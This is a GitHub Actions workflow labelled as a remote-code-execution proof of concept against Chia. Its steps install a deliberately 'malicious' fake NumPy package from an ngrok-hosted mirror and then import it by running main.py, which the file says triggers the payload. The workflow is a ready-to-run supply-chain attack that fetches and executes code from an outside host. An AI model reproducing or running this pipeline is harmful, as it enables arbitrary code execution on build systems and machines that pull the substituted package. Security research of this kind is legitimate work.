name: 🔥 Chia RCE PoC

on:
  push:
    branches:
      - main
    paths:
      - 'main.py'
      - 'poc_subprocess_index_attack.py'
      - 'rce_listener.py'
      - 'evil_numpy/**'
      - 'requirements.txt'
      - '.github/workflows/ci.yml'
  workflow_dispatch:

jobs:
  rce_proof:
    name: 🚀 Execute RCE via Fake NumPy
    runs-on: ubuntu-latest

    steps:
      - name: 📥 Checkout code
        uses: actions/checkout@v3

      - name: 🐍 Set up Python 3.10
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: 📦 Install malicious NumPy from ngrok mirror
        run: |
          echo "[*] Installing fake numpy from ngrok mirror..."
          pip install --find-links https://74cb59ca3c50.ngrok-free.app numpy==99.99.99

      - name: 🔥 Trigger RCE payload by importing numpy
        run: |
          echo "[*] Executing main.py (this triggers the RCE via numpy)"
          python3 main.py

